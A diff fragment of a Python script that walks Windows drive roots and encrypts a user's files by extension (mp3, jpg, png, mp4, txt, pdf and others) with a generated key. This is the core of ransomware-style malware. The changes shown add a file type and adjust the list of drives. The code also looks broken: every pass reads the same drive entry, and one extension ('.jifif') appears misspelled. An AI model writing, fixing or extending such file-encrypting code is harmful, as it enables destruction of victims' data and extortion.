@@ -10,20 +10,22 @@ def get_files(type_file,partition,key):
                 file_name = r+file
                 encrypt.encrypt(file_name,key)
                 print(f"{r+file}")
-
+            else :
+                print("not found !")
 
 key = encrypt.generate_key()
 m = encrypt.load_key()
 
-drives = ["W" , "D" , "G" , "F" , "I" , "E"]
+drives = ["W" , "D" , "G" , "F" , "E"]
 
 
-for _ in range(6):
+for _ in range(5):
     
     get_files(".mp3",f"{drives[-1]}:\\",key)     
     get_files(".jpg",f"{drives[-1]}:\\",key)
     get_files(".jpeg",f"{drives[-1]}:\\",key)
     get_files(".png",f"{drives[-1]}:\\",key)
+    get_files(".jifif",f"{drives[-1]}:\\",key)
     get_files(".mp4",f"{drives[-1]}:\\",key)
     get_files(".txt",f"{drives[-1]}:\\",key)
     get_files(".pdf",f"{drives[-1]}:\\",key)
